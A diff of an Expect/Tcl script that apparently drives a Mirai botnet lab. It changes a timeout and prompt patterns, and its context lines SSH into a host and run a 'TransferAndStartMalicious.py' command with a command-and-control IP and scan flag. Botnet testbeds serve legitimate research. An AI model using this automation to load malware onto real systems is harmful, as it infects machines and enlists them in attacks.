@@ -13,7 +13,7 @@ set outputTime [lindex $argv 9]
 set debug_path "Mirai-Source-Code/mirai/debug"
 set transferAndStartMalicious "TransferAndStartMalicious.py"
 
-set timeout 1200
+set timeout 10
 
 # SSH connection
 spawn /bin/bash $delKnownHosts
@@ -36,10 +36,10 @@ puts $outputTimeFile $DATE
 close $outputTimeFile
 
 # Load Malicious Code
-expect "$debug_path# "
+expect "*debug# "
 send "nohup python3 $path/$transferAndStartMalicious $CNC_ip $input_bot $scan_flag $path/$pids_file &\r"
 expect "output to 'nohup.out'"
 send "\r"
 
-expect "$debug_path# "
+expect "*debug# "
 send "exit\r"
